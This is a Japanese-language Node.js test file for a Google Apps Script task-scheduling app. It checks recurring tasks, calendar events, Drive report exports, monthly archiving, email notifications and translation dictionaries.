  ok('管理者が画面を開いているあいだに、残りの予定を早い順に少しずつ作る（1 回に 4 つ）', e.events.length === ev0 + 9 && rows().filter(r => r.event_id === 'wait').length === 1 && st.tasks[0].hasEvent && e.events.slice(ev0 + 1).every(x => x.o.sendInvites === false));
  ok('あとから作る予定が残っているあいだは、見張りを置く（画面を閉じていても進む）', st.tick.want === true && e.triggers.length === 1);
  e.runTick();
  e.runTick();
  ok('ぜんぶ作り終えたら、しるしは残らない', rows().filter(r => r.event_id === 'wait').length === 0 && e.events.length === ev0 + 10 && new Set(rows().map(r => r.event_id)).size === 10);
  // 途中のタスクから後ろを消す
  e.user = 'sato@example.com'; e.now = at(0) + 5 * D + 9 * 3600000;
  all = rows().sort((x, y) => x.start_ms - y.start_ms);
  a2.updateTask(all[5].id, 'start', {});
  e.user = 'admin@example.com'; e.now = at(8, 0);
  const live = () => e.events.filter(x => !x.deleted).length;
  const before = live();
  st = a2.deleteTask(all[3].id, true);
  ok('「これ以降の繰り返しも」で消すと、後ろの、まだ始めていないタスクも消える（始めたタスクと、前のタスクは残る）', rows().length === 4 && rows().map(r => r.id).sort().join() === [all[0].id, all[1].id, all[2].id, all[5].id].sort().join() && /以降の繰り返しタスク 5 件も削除しました/.test(st.notice));
  ok('消したタスクの予定も消える', live() === before - 6);
  st = a2.deleteTask(all[1].id);
  ok('ふつうに消すと、そのタスクだけ', rows().length === 3);
  // 毎週
  st = a2.createTask({ title: '週の点検', member: '', start: at(13), end: at(14), repeat: 'weekly', days: [new Date(at(0)).getDay(), (new Date(at(0)).getDay() + 2) % 7], until: ds(at(0) + 13 * D) });
  const wk = rows().filter(r => r.title === '週の点検');
  ok('毎週の繰り返し: 選んだ曜日だけにできる。未割り当てなら、予定は作らない', wk.length === 4 && wk.every(r => r.event_id === '' && r.member_email === '') && /毎週 .・.、/.test(st.notice));
  throws('終わりの日がなければ断る', () => a2.createTask({ title: 'x', start: at(9), end: at(10), repeat: 'daily' }), /終了日/);
  throws('終わりの日が始まりより前なら断る', () => a2.createTask({ title: 'x', start: at(9), end: at(10), repeat: 'daily', until: ds(at(0) - D) }), /開始日以降/);
  throws('毎週で曜日がなければ断る', () => a2.createTask({ title: 'x', start: at(9), end: at(10), repeat: 'weekly', days: [], until: ds(at(0) + 7 * D) }), /曜日/);
  throws('3 か月を超える繰り返しは断る', () => a2.createTask({ title: 'x', start: at(9), end: at(10), repeat: 'weekly', days: [1], until: ds(at(0) + 120 * D) }), /3 か月以内/);
  throws('60 件を超える繰り返しは断る', () => a2.createTask({ title: 'x', start: at(9), end: at(10), repeat: 'daily', until: ds(at(0) + 80 * D) }), /最大 60 件/);
  const cnt = rows().length;
  ok('断ったときは、1 件もできない', cnt === rows().length && rows().filter(r => r.title === 'x').length === 0);
  // 予定を作っているあいだに変わったタスク
  st = a2.createTask({ title: '入れ替わり', member: 'sato@example.com', start: at(15), end: at(16), repeat: 'daily', until: ds(at(0) + 1 * D) });
  { const d = e.sheets.tasks._d; const i = d[0].indexOf('event_id'); d.forEach((row, k) => { if (k && row[d[0].indexOf('title')] === '入れ替わり' && row[d[0].indexOf('start_ms')] > at(23)) row[i] = 'wait'; }); }
  const second = rows().filter(r => r.title === '入れ替わり' && r.event_id === 'wait')[0];
  a2.editTask(second.id, { title: '入れ替わり', member: 'sato@example.com', start: second.start_ms + 3600000, end: second.end_ms + 3600000, memo: '', address: '' });
  const after = rows().filter(r => r.id === second.id)[0];
  ok('予定を作る前のタスクを変えると、その場で予定ができる（しるしは外れる）', after.event_id !== 'wait' && after.event_id !== '');
}

// ドライブのフォルダの整理と、日報・週報・月報の書き出し（v0.51）
{
  const e = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a2 = e.api;
  const on = (d, h, m) => new Date(2026, 10, d, h, m || 0).getTime();
  e.now = on(16, 8); a2.initProject({ name: '設備メンテナンス部' });
  a2.addMember({ email: 'sato@example.com', name: '佐藤 健太', board: '点検' });
  a2.addMember({ email: 'suzuki@example.com', name: '鈴木 美咲', board: '点検' });
  const tp = a2.saveTemplate({ name: '空調点検', board: '点検', minutes: 60, fields: [{ label: '台数', type: 'number', required: false }, { label: '写真', type: 'photo', required: false }] }).templates[0];
  a2.saveShift({ member: 'sato@example.com', date: '2026-11-16', start: '09:00', end: '17:00', repeat: 'weekly', days: [1, 2, 3, 4, 5], until: '' });
  const mk = (title, who, d, h1, h2) => { e.now = on(d, 8); return a2.createTask({ title, member: who, start: on(d, h1), end: on(d, h2), templateId: tp.id }) && e.sheets.tasks._d[e.sheets.tasks._d.length - 1][0]; };
  const run = (id, who, d, s1, s2, v) => { e.user = who; e.now = on(d, 0) + s1 * 60000; a2.updateTask(id, 'start', {}); e.now = on(d, 0) + s2 * 60000; a2.updateTask(id, 'done', { values: { [tp.fields[0].key]: v } }); e.user = 'admin@example.com'; };
  const t1 = mk('月曜の点検', 'sato@example.com', 16, 9, 10); run(t1, 'sato@example.com', 16, 9 * 60, 10 * 60, 4);              // 60 分・シフト内
  const t2 = mk('火曜の点検', 'sato@example.com', 17, 9, 10); run(t2, 'sato@example.com', 17, 9 * 60 + 15, 10 * 60 + 45, 6);    // 90 分・15 分の遅延・シフト内
  const t3 = mk('火曜の夜間', 'sato@example.com', 17, 18, 19); run(t3, 'sato@example.com', 17, 18 * 60, 18 * 60 + 30, 1);       // 30 分・シフト外
  const t4 = mk('火曜の鈴木', 'suzuki@example.com', 17, 13, 14); run(t4, 'suzuki@example.com', 17, 13 * 60, 13 * 60 + 48, 2);   // 48 分・シフトなし
  mk('火曜の未割り当て', '', 17, 15, 16);
  mk('来週の点検', 'sato@example.com', 24, 9, 10);
  mk('来月の点検', 'sato@example.com', 31 + 2, 9, 10);
  // 写真（前の版のように、いちばん上のフォルダに置かれている）
  const PX = 'data:image/jpeg;base64,' + 'A'.repeat(400);
  e.user = 'admin@example.com'; e.now = on(17, 11);
  a2.addTaskPhoto(t2, { field: tp.fields[1].key, thumb: PX, full: PX });
  a2.addTaskPhoto(t2, { field: tp.fields[1].key, thumb: PX, full: PX });
  const root = e.drive.filter(f => f.name === 'Scurrop - 設備メンテナンス部')[0];
  const month = e.drive.filter(f => f.folder && f.name === '2026-11')[0];
  const files = e.drive.filter(f => !f.folder);
  files.forEach(f => { f.parents = [root.id]; });
  { const d = e.sheets.task_photos._d; d[2][d[0].indexOf('time_ms')] = on(1, 9) - 86400000; } // 2 枚目は、10 月の写真だったことにする
  let r = a2.tidyDrive();
  const oct = e.drive.filter(f => f.folder && f.name === '2026-10')[0];
  ok('「フォルダを整理」で、いちばん上に置かれていた写真が、月ごとのフォルダに移る', r.moved === 2 && r.failed === 0 && r.left === 0 && files[0].parents.join() === month.id && !!oct && files[1].parents.join() === oct.id && r.url === 'https://drive.google.com/drive/folders/' + root.id);
  r = a2.tidyDrive();
  ok('もう一度整理しても、何も動かない', r.moved === 0 && r.failed === 0);
  ok('整理したことが履歴に残る', a2.getState().history.some(h => h.action === 'setting' && /ドライブのフォルダを整理（写真 2 枚を月別フォルダへ移動）/.test(h.note)));
  ok('管理者には、ドライブのフォルダを開く先が届く', a2.getState().folderUrl === 'https://drive.google.com/drive/folders/' + root.id);
  e.user = 'sato@example.com';
  throws('メンバーは、フォルダを整理できない', () => a2.tidyDrive(), /管理者/);
  ok('メンバーには、フォルダを開く先は届かない', a2.getState().folderUrl === '');
  throws('メンバーは、書き出せない', () => a2.exportBoard({ day: '2026-11-17', span: 'day' }), /管理者/);
  e.user = 'admin@example.com';
  // 日報
  e.now = on(17, 20);
  let x = a2.exportBoard({ day: '2026-11-17', span: 'day' });
  const fileOf = (name) => e.drive.filter(f => f.name === name && !f.trashed)[0];
  const dirX = e.drive.filter(f => f.folder && f.name === 'レポート')[0];
  let f = fileOf('日次データ 2026-11-17（火） - 設備メンテナンス部');
  let bk = f && e.books[f.id]._sheets;
  ok('日のボードを書き出すと、「書き出し」のフォルダに「日報 日付（曜日） - プロジェクト名」のスプレッドシートができる', !!f && dirX.parents[0] === root.id && f.parents[0] === dirX.id && x.name === f.name && x.updated === false && x.rows === 4 && x.url === 'https://docs.google.com/spreadsheets/d/' + f.id + '/edit#gid=' + bk['メンバー別'].getSheetId());
  ok('シートは「メンバー別」と「タスク」（日報には「日ごと」はない）。初めからある空のシートは外す', Object.keys(bk).join() === 'メンバー別,タスク');
  const mrow = (b, name) => b['メンバー別']._d.filter(r => r[1] === name)[0];
  ok('メンバー別: ボード・メンバー・ロール・シフト（時間）・稼働日数・タスク・完了・稼働時間・シフト外稼働・遅延', bk['メンバー別']._d[0].join() === 'ボード,メンバー,ロール,シフト（時間）,稼働日数,タスク,完了,稼働時間（時間）,シフト外稼働（時間）,遅延（回）' && mrow(bk, '佐藤 健太').join() === '点検,佐藤 健太,メンバー,8,1,2,2,2,0.5,1');
  ok('シフトのない人の稼働は、ぜんぶシフト外に数える。未割り当ての行と、合計の行がある', mrow(bk, '鈴木 美咲').slice(3).join() === '0,1,1,1,0.8,0.8,0' && mrow(bk, '未割り当て')[5] === 1 && mrow(bk, '合計').slice(3).join() === '8,2,4,3,2.8,1.3,1');
  const th = bk['タスク']._d[0], tc = (n) => th.indexOf(n);
  ok('タスク: その日のタスクだけ。稼働リストと同じ列（計算用の列はなし）で、シフトとの関係とフィールドの値も入る', bk['タスク']._d.length === 5 && th.indexOf('完了数') < 0 && tc('台数') > 0 && bk['タスク']._d.filter(r => r[tc('タスク')] === '火曜の夜間')[0][tc('シフト内外')] === 'シフト外' && bk['タスク']._d.filter(r => r[tc('タスク')] === '火曜の点検')[0][tc('台数')] === 6 && bk['タスク']._d.filter(r => r[tc('タスク')] === '火曜の点検')[0][tc('写真')] === '開く');
  ok('見た目: 見出しは紺、絞り込みつき', bk['タスク']._fmt.some(q => q[0] === 'setBackground' && q[1] === '#1F2E38') && !!bk['タスク']._filter && !!bk['メンバー別']._filter);
  const n1 = e.drive.length;
  x = a2.exportBoard({ day: '2026-11-17', span: 'day' });
  ok('同じ日をもう一度書き出すと、同じファイルを新しくする（ファイルは増えない）', e.drive.length === n1 && x.updated === true && e.books[f.id]._sheets['タスク']._d.length === 5 && x.notes.length === 0);
  // 週報
  x = a2.exportBoard({ day: '2026-11-17', span: 'week' });
  f = fileOf('週次データ 2026-11-16〜11-22 - 設備メンテナンス部'); bk = f && e.books[f.id]._sheets;
  ok('週のボードを書き出すと「週報 月曜の日付〜日曜の日付」。シートは「メンバー別」「日ごと」「タスク」', !!f && f.parents[0] === dirX.id && Object.keys(bk).join() === 'メンバー別,日別,タスク' && x.rows === 5);
  ok('週報のメンバー別: シフトは週の合計（8 時間 × 5 日）、稼働日数は 2 日', mrow(bk, '佐藤 健太').slice(3).join() === '40,2,3,3,3,0.5,1');
  ok('日ごと: メンバー × 日の稼働時間（稼働のない日は空）と合計', bk['日別']._d[0].join() === 'ボード,メンバー,11/16（月）,11/17（火）,11/18（水）,11/19（木）,11/20（金）,11/21（土）,11/22（日）,合計（時間）' && bk['日別']._d.filter(q => q[1] === '佐藤 健太')[0].slice(2).join() === '1,2,,,,,,3');
  // 月報
  x = a2.exportBoard({ day: '2026-11-17', span: 'month' });
  f = fileOf('月次データ 2026-11 - 設備メンテナンス部'); bk = f && e.books[f.id]._sheets;
  ok('月のボードを書き出すと「月報 年-月」。その月のタスクだけが入る（来月の分は入らない）', !!f && x.rows === 6 && bk['日別']._d[0].length === 2 + 30 + 1 && !bk['タスク']._d.some(q => q[tc('タスク')] === '来月の点検') && mrow(bk, '佐藤 健太')[3] === 8 * 11); // シフトは 11/16 からの平日（11 日ぶん）
  ok('書き出したことが履歴に残る', a2.getState({ day: '2026-11-17' }).history.some(h => h.action === 'report' && /月次データを出力（2026-11、6 件）/.test(h.note)));
  // 名前に ' が入っていても探せる
  a2.setProject({ name: "Bob's 店" });
  ok('プロジェクト名を変えると、ドライブのフォルダの名前も変わる', root.name === "Scurrop - Bob's 店");
  a2.exportBoard({ day: '2026-11-17', span: 'day' }); const n2 = e.drive.length;
  x = a2.exportBoard({ day: '2026-11-17', span: 'day' });
  ok("名前に ' が入っていても、同じファイルを見つけて新しくする", e.drive.length === n2 && x.updated === true);
  // うまくいかないとき
  e.listFail = true; const n3 = e.drive.length;
  x = a2.exportBoard({ day: '2026-11-17', span: 'day' });
  ok('前のファイルを探せないときは、新しく作る（止まらない）', e.drive.length === n3 + 1 && x.updated === false && !!x.url);
  e.listFail = false;
  e.driveFail = true;
  throws('ドライブに作れないときは、理由を返す', () => a2.exportBoard({ day: '2026-11-18', span: 'day' }), /ドライブに出力できませんでした/);
  e.driveFail = false; e.noDrive = true;
  throws('Drive のサービスがないときも、理由を返す', () => a2.exportBoard({ day: '2026-11-18', span: 'day' }), /サービスが有効になっていません/);
  throws('Drive のサービスがないと、整理もできない', () => a2.tidyDrive(), /サービスが有効になっていません/);
  e.noDrive = false;
  e.drive.filter(q => q.folder && q.name === 'レポート')[0].trashed = true;
  x = a2.exportBoard({ day: '2026-11-18', span: 'day' });
  ok('「書き出し」のフォルダを消されていたら、作り直して書き出す', !!x.url && e.drive.filter(q => q.folder && q.name === 'レポート' && !q.trashed).length === 1);
  a2.openSummary();
  const sumF = e.drive.filter(q => q.id === e.props.SUM_FILE)[0];
  a2.setProject({ name: '新しい名前' });
  ok('プロジェクト名を変えると、集計のスプレッドシートの名前も変わる', sumF.name === '稼働リスト - 新しい名前');
}

// 過去のデータを、月ごとにドライブへ移す（v0.52）
{
  const e = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a2 = e.api;
  const on = (mo, d, h, m) => new Date(2026, mo - 1, d, h, m || 0).getTime();
  e.now = on(9, 1, 8); a2.initProject({ name: '設備メンテナンス部' });
  a2.addMember({ email: 'sato@example.com', name: '佐藤 健太', board: '' });
  const tp = a2.saveTemplate({ name: '点検', board: '', minutes: 60, fields: [{ label: '結果', type: 'text', required: false }, { label: '写真', type: 'photo', required: false }] }).templates[0];
  const PX = 'data:image/jpeg;base64,' + 'A'.repeat(400);
  const mk = (title, mo, d, who) => { e.user = 'admin@example.com'; e.now = on(mo, d, 8); a2.createTask({ title, member: who === undefined ? 'sato@example.com' : who, start: on(mo, d, 9), end: on(mo, d, 10), templateId: tp.id }); const dd = e.sheets.tasks._d; return dd[dd.length - 1][0]; };
  const fin = (id, mo, d, v) => { e.user = 'sato@example.com'; e.now = on(mo, d, 9, 5); a2.updateTask(id, 'start', {}); e.now = on(mo, d, 9, 50); a2.updateTask(id, 'done', { values: { [tp.fields[0].key]: v } }); e.user = 'admin@example.com'; };
  const s1 = mk('9月A', 9, 10); fin(s1, 9, 10, '良');
  const o1 = mk('10月A', 10, 5); fin(o1, 10, 5, '=1+1');
  const o2 = mk('10月B', 10, 6); fin(o2, 10, 6, '良');
  const o3 = mk('10月C（進行中）', 10, 20); e.user = 'sato@example.com'; e.now = on(10, 20, 9); a2.updateTask(o3, 'start', {}); e.user = 'admin@example.com';
  const o4 = mk('10月D（未割り当て）', 10, 21, '');
  e.now = on(10, 6, 11); a2.addTaskPhoto(o2, { field: tp.fields[1].key, thumb: PX, full: PX });
  a2.linkTasks(o1, o2, '引き継ぎ', false);
  e.now = on(10, 15, 12); a2.setRule(a2.getState().rules.filter(x => x.when === 'start')[0].id, true); // タスクに付かない履歴（設定の変更）
  const n1 = mk('11月A', 11, 3); fin(n1, 11, 3, '良');
  a2.linkTasks(o2, n1, '続き', false);
  const n2 = mk('11月B', 11, 17);
  e.now = on(11, 17, 13);
  const rowsOf = (name) => e.sheets[name]._d.slice(1);
  const tcol = (name, c) => e.sheets[name]._d[0].indexOf(c);
  let ls = a2.listArchive();
  ok('移せる月の一覧: 今月より前で、タスクのある月（進行中のタスクの数は別に出る）', ls.months.map(m => m.month + ':' + m.tasks + ':' + m.active).join() === '2026-09:1:0,2026-10:3:1');
  throws('今月は移せない', () => a2.archiveMonth('2026-11'), /当月以降はアーカイブできません/);
  throws('先の月は移せない', () => a2.archiveMonth('2026-12'), /アーカイブできません/);
  throws('月の形が違えば断る', () => a2.archiveMonth('2026-13'), /月を確認/);
  throws('タスクのない月は断る', () => a2.archiveMonth('2026-08'), /タスクがありません/);
  e.user = 'sato@example.com';
  throws('メンバーは移せない', () => a2.archiveMonth('2026-10'), /管理者/);
  throws('メンバーは一覧も見られない', () => a2.listArchive(), /管理者/);
  e.user = 'admin@example.com';
  const before = { tasks: rowsOf('tasks').length, history: rowsOf('history').length, links: rowsOf('links').length, photos: rowsOf('task_photos').length, thumbs: rowsOf('task_thumbs').length };
  const fileCount = e.drive.filter(f => !f.folder && f.mimeType === 'image/jpeg').length;
  // 失敗させる: 元のデータは消えない
  e.driveFail = true;
  throws('ドライブに作れないときは、何も移さない', () => a2.archiveMonth('2026-10'), /ドライブへアーカイブできませんでした/);
  e.driveFail = false;
  ok('失敗したとき、元のデータはそのまま', rowsOf('tasks').length === before.tasks && rowsOf('history').length === before.history);
  let r = a2.archiveMonth('2026-10');
  const dir = e.drive.filter(f => f.folder && f.name === 'アーカイブ')[0];
  const f = e.drive.filter(q => q.id && q.name === 'アーカイブ 2026-10 - 設備メンテナンス部')[0];
  const bk = f && e.books[f.id]._sheets;
  ok('10 月を移すと、「過去のデータ」のフォルダに「過去のデータ 2026-10 - プロジェクト名」ができる', !!f && dir.parents[0] === e.props.PHOTO_FOLDER && f.parents[0] === dir.id && r.name === f.name && r.url === 'https://docs.google.com/spreadsheets/d/' + f.id + '/edit#gid=' + bk['稼働リスト'].getSheetId());
  ok('移るのは、その月に始まるタスク（進行中のものは残す）。件数が返る', r.tasks === 3 && r.kept === 1 && r.links === 2 && r.photos === 1 && rowsOf('tasks').length === before.tasks - 3 && rowsOf('tasks').map(x => x[1]).join() === '9月A,10月C（進行中）,11月A,11月B');
  ok('移した先には、読むための「稼働リスト」と、元の形のままのシートが入る', Object.keys(bk).join() === '稼働リスト,tasks,history,links,task_photos,task_thumbs' && bk['稼働リスト']._d.length === 4 && bk['稼働リスト']._d[0].indexOf('完了数') < 0 && bk.tasks._d.length === 4 && bk.tasks._d[0].join() === e.sheets.tasks._d[0].join() && bk.tasks._d.slice(1).map(x => x[1]).join() === '10月A,10月B,10月D（未割り当て）');
  const hNote = (b) => b.history._d.slice(1).map(x => x[4] + ':' + x[3]);
  ok('履歴: 移したタスクの履歴と、その月の、タスクに付かない履歴（設定の変更）が移る。残したタスクの履歴は残る', r.history === bk.history._d.length - 1 && hNote(bk).some(x => x === 'done:' + o1) && bk.history._d.slice(1).some(x => x[4] === 'setting' && /通知「開始」をオン/.test(String(x[5]))) && !hNote(bk).some(x => x.endsWith(':' + o3)) && rowsOf('history').some(x => x[3] === o3 && x[4] === 'start') && !rowsOf('history').some(x => x[3] === o1) && rowsOf('history').length === before.history - r.history + 1);
  ok('リンク: 移したタスクのリンクは、相手が残っていても移る', bk.links._d.length === 3 && rowsOf('links').length === before.links - 2);
  ok('写真: 記録は移り、小さい画像は消す。元の画像は、ドライブに残す', bk.task_photos._d.length === 2 && rowsOf('task_photos').length === before.photos - 1 && rowsOf('task_thumbs').length === before.thumbs - 1 && e.drive.filter(q => !q.folder && q.mimeType === 'image/jpeg' && !q.trashed).length === fileCount);
  const lh = bk['稼働リスト']._d[0], lc = (n) => lh.indexOf(n);
  ok('移した先の稼働リストには、報告の値や写真のリンクも入る。式は式として動かない', bk['稼働リスト']._d.filter(x => x[lc('タスク')] === '10月B')[0][lc('写真')] === '開く' && bk['稼働リスト']._d.filter(x => x[lc('タスク')] === '10月A')[0][lc('結果')] === '=1+1' && bk.tasks._d.filter(x => x[1] === '10月A')[0][bk.tasks._d[0].indexOf('values')].includes('=1+1') && e.formulas.length === 0);
  ok('続いている行は、まとめて消す（1 行ずつ消さない）', e.reads.del <= 8);
  let st = a2.getState({ day: '2026-10-05' });
  ok('移した月は、ボードに出なくなる', st.tasks.length === 0 && a2.getState({ day: '2026-10-20' }).tasks.length === 1);
  ok('移したことが、元の履歴に残る', a2.getState().history.some(h => h.action === 'setting' && /過去データをアーカイブ（2026-10、タスク 3 件・履歴 \d+ 件）/.test(h.note)));
  ok('今日のタスクは、そのまま使える', a2.getState().tasks.length === 1 && a2.getState().tasks[0].title === '11月B' && (() => { e.user = 'sato@example.com'; const z = a2.updateTask(n2, 'start', {}); e.user = 'admin@example.com'; return z.tasks[0].status === 'active'; })());
  ls = a2.listArchive();
  ok('移したあとの一覧: 10 月は、進行中の 1 件だけが残る', ls.months.map(m => m.month + ':' + m.tasks + ':' + m.active).join() === '2026-09:1:0,2026-10:0:1');
  throws('進行中のタスクしかない月は、完了してからと知らせる', () => a2.archiveMonth('2026-10'), /すべて進行中/);
  e.user = 'sato@example.com'; e.now = on(11, 17, 14); a2.updateTask(o3, 'done', {}); e.user = 'admin@example.com';
  r = a2.archiveMonth('2026-10');
  ok('残っていた分をあとから移すと、番号の付いた別のファイルになる', r.tasks === 1 && r.kept === 0 && r.name === 'アーカイブ 2026-10（2） - 設備メンテナンス部' && e.drive.filter(q => /^アーカイブ 2026-10/.test(q.name)).length === 2);
  // 消している途中で失敗
  e.deleteFail = true;
  const t9 = rowsOf('tasks').length;
  throws('元のデータを消す途中で失敗したら、そのことと、やり直し方を知らせる', () => a2.archiveMonth('2026-09'), /元データの削除中に失敗/);
  e.deleteFail = false;
  ok('そのとき、元のデータは残っている', rowsOf('tasks').length === t9);
  r = a2.archiveMonth('2026-09');
  ok('もう一度移すと、残りを移せる', r.tasks === 1 && rowsOf('tasks').map(x => x[1]).join() === '11月A,11月B');
  ok('集計には、移したあとのデータだけが出る', a2.openSummary().rows === 2);
}

// 知らせは Scurrop のメールで。カレンダーの招待メールは、設定でオンにしたときだけ（v0.53）
{
  const e = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a2 = e.api; e.now = at(8, 0); a2.setup();
  a2.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  a2.addMember({ email: 'suzuki@example.com', name: '鈴木 陽菜', board: '' });
  let n = e.mails.length;
  let st = a2.createTask({ title: '点検', member: 'sato@example.com', start: at(9), end: at(10), address: '中央区' });
  const id = st.tasks[0].id;
  ok('初めは、カレンダーの招待メールを送らない（メンバーは予定のゲストには入る）。知らせは Scurrop の「割り当て」のメール 1 通', st.defaults.invite === false && e.events[0].o.sendInvites === false && e.events[0].o.guests === 'sato@example.com' && e.mails.length === n + 1 && /^割り当て: 点検/.test(e.mails[n].subject));
  st = a2.setDefaults({ invite: true });
  ok('設定でオンにできる（履歴に残る）', st.defaults.invite === true && e.props.CAL_INVITE === 'true' && st.history.some(h => h.action === 'setting' && /カレンダーの招待メールをオン/.test(h.note)));
  a2.createTask({ title: '点検 2', member: 'sato@example.com', start: at(11), end: at(12) });
  ok('オンにすると、カレンダーの招待メールも送る', e.events[e.events.length - 1].o.sendInvites === true);
  const ev0 = e.events.length;
  a2.createTask({ title: '定期', member: 'sato@example.com', start: at(13), end: at(14), repeat: 'daily', until: (() => { const d = new Date(at(0) + 2 * 86400000); return d.getFullYear() + '-' + String(d.getMonth() + 1).padStart(2, '0') + '-' + String(d.getDate()).padStart(2, '0'); })() });
  ok('オンでも、繰り返しのタスクでは 1 つずつの招待メールは送らない', e.events.slice(ev0).length === 3 && e.events.slice(ev0).every(x => x.o.sendInvites === false));
  st = a2.setDefaults({ invite: false });
  ok('オフに戻せる。位置情報と Meet の初めの値は、そのまま', st.defaults.invite === false && e.props.CAL_INVITE === undefined && st.defaults.geo === false);
  const hn = a2.getState().history.length;
  a2.setDefaults({ invite: false });
  ok('同じ値にしても、履歴は増えない', a2.getState().history.length === hn);
  e.user = 'sato@example.com';
  throws('メンバーは、設定を変えられない', () => a2.setDefaults({ invite: true }), /管理者/);
  ok('メンバーには、この設定は見せない', a2.getState().defaults.invite === false);
  e.user = 'admin@example.com';
  // 変更の知らせ
  const rule = a2.getState().rules.filter(r => r.when === 'edit')[0];
  ok('通知に「変更 → メンバー」がある。初めはオフ', !!rule && rule.enabled === false && rule.then.join() === 'notify_member');
  n = e.mails.length;
  a2.editTask(id, { title: '点検', member: 'sato@example.com', start: at(9, 30), end: at(10, 30), memo: '', address: '中央区' });
  ok('オフのあいだは、時間を変えてもメールは出ない', e.mails.length === n);
  a2.setRule(rule.id, true);
  a2.editTask(id, { title: '点検', member: 'sato@example.com', start: at(10), end: at(11), memo: '裏口から', address: '港区' });
  ok('オンにすると、時間・メモ・住所を変えたときに、メンバーに「変更」のメールが届く（変えたところ・新しい時間・住所つき）', e.mails.length === n + 1 && e.mails[n].to === 'sato@example.com' && /^変更: 点検 10:00–11:00（佐藤 美咲）$/.test(e.mails[n].subject) && /変更内容: 時間 10:00–11:00・メモ・住所/.test(e.mails[n].body) && /住所: 港区/.test(e.mails[n].body) && /変更内容/.test(e.mails[n].options.htmlBody));
  n = e.mails.length;
  a2.editTask(id, { title: '点検', member: 'sato@example.com', start: at(10), end: at(11), memo: '裏口から', address: '港区', geo: true });
  ok('位置情報の記録だけを変えたときは、知らせない', e.mails.length === n);
  a2.editTask(id, { title: '点検', member: 'suzuki@example.com', start: at(10), end: at(11), memo: '裏口から', address: '港区' });
  ok('ほかの人に変えたときは「割り当て」だけ（「変更」は重ねて出さない）', e.mails.length === n + 1 && /^割り当て:/.test(e.mails[n].subject) && e.mails[n].to === 'suzuki@example.com');
  n = e.mails.length;
  a2.createTask({ title: '自分の', member: 'admin@example.com', start: at(15), end: at(16) });
  const own = a2.getState().tasks.filter(t => t.title === '自分の')[0].id;
  a2.editTask(own, { title: '自分の', member: 'admin@example.com', start: at(16), end: at(17), memo: '', address: '' });
  ok('自分で自分のタスクを変えたときは、知らせない', e.mails.length === n);
  a2.resetProject();
  ok('リセットで、招待メールの設定も消える', Object.keys(e.props).filter(k => k !== 'URL_LIST').length === 0);
}

// 言語（v0.56）: 始めるときに決める。日本語のほかに English・Français・Español・繁體中文
{
  const fs2 = require('fs');
  const gs = fs2.readFileSync(__dirname + '/../src/Code.gs', 'utf8'), page = fs2.readFileSync(__dirname + '/../src/index.html', 'utf8');
  const body = (t) => { const i = t.indexOf('function trText_(s, dict, lang, cache) {'); return t.slice(i, t.indexOf('\n}\n', i) + 2); };
  ok('文言を置き換える処理は、サーバーと画面で同じ', body(gs).length > 500 && body(gs) === body(page));
  const shown = require('../tools/i18n-build.js').ENABLED.filter(l => l !== 'ja');
  const dicts = {}; shown.forEach(l => { dicts[l] = JSON.parse(fs2.readFileSync(__dirname + '/../i18n/' + l + '.json', 'utf8')); });
  const keys = Array.from(new Set(require('../tools/strings.js').list.map(x => x[2])));
  const miss = []; Object.keys(dicts).forEach(l => keys.forEach(k => { if (typeof dicts[l][k] !== 'string') miss.push(l + ': ' + k); }));
  ok('画面とメールの文言は、選べる言語（英語）すべてに対訳がある（文言を足したら、対訳も足す）' + (miss.length ? ' → ' + miss.slice(0, 5).join(' | ') : ''), keys.length > 600 && miss.length === 0);
  ok('src/I18n.gs は、i18n/*.json から作ったものと同じ（node tools/i18n-build.js）', fs2.readFileSync(__dirname + '/../src/I18n.gs', 'utf8') === require('../tools/i18n-build.js').build());
  const JA = /[ぁ-んァ-ヶ一-龥]/;
  const e = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a2 = e.api; e.now = at(8, 0);
  let boot = JSON.parse(a2.doGet({ parameter: {} }).boot);
  ok('始める前のページには、選べる言語の名前（日本語・English）と、その対訳が付く。初めは日本語。フランス語・スペイン語・繁體中文は、訳を確かめるまで出さない（訳のファイルは残す）', boot.lang === 'ja' && Object.keys(boot.langs).join() === 'ja,en' && boot.langs.en === 'English' && boot.dict === null && Object.keys(boot.dicts).join() === 'en' && boot.wds.en[0] === 'Sun' && shown.join() === 'en' && ['fr', 'es', 'zh-TW'].every(l => fs2.existsSync(__dirname + '/../i18n/' + l + '.json')));
  let st = a2.initProject({ name: 'Maintenance', lang: 'en' });
  boot = JSON.parse(a2.doGet({ parameter: {} }).boot);
  ok('英語で始めると、言語が決まる。始めたあとのページには、その言語の対訳だけが付く', e.props.LANG === 'en' && boot.lang === 'en' && boot.dict['保存'] === dicts.en['保存'] && boot.dicts === null && boot.langs === null && boot.wd.join() === 'Sun,Mon,Tue,Wed,Thu,Fri,Sat');
  throws('始めたあとは、言語を変える入口がない（もう一度始めることはできない）', () => a2.initProject({ name: 'x', lang: 'ja' }), /設定済み/);
  a2.addMember({ email: 'alice@example.com', name: 'Alice', board: '' });
  const n = e.mails.length;
  a2.createTask({ title: 'AC inspection', member: 'alice@example.com', start: at(9), end: at(10), address: '1 Main St', memo: 'Back door' });
  const m = e.mails[n];
  ok('メールの件名と札は、場所に合わせた訳になる（割り当て → Assigned。ボタンの Assign とは別）', /^Assigned: AC inspection/.test(m.subject) && />Assigned</.test(m.options.htmlBody) && dicts.en['割り当て'] === 'Assign');
  ok('メールは、プロジェクトの言語で届く（件名・本文・HTML に日本語が残らない）', /^Assign/.test(m.subject) && /AC inspection 9:00–10:00/.test(m.subject) && !JA.test(m.subject) && !JA.test(m.body) && !JA.test(m.options.htmlBody) && /1 Main St/.test(m.body) && m.options.htmlBody.includes(dicts.en['タスクを開く']));
  ok('カレンダーの予定の説明も、その言語', !JA.test(e.events[e.events.length - 1].o.description) && /Back door/.test(e.events[e.events.length - 1].o.description));
  e.user = 'alice@example.com'; e.now = at(9, 5); const tid = a2.getState().tasks[0].id; a2.updateTask(tid, 'start', {}); e.now = at(9, 50); a2.updateTask(tid, 'done', { note: 'ok' }); e.user = 'admin@example.com';
  const x = a2.exportBoard({ day: '', span: 'day' });
  const f = e.drive.filter(q => q.name === x.name)[0]; const bk = e.books[f.id]._sheets;
  const cells = [].concat(...Object.keys(bk).map(k => [k].concat(...bk[k]._d.map(r => r.map(String)))));
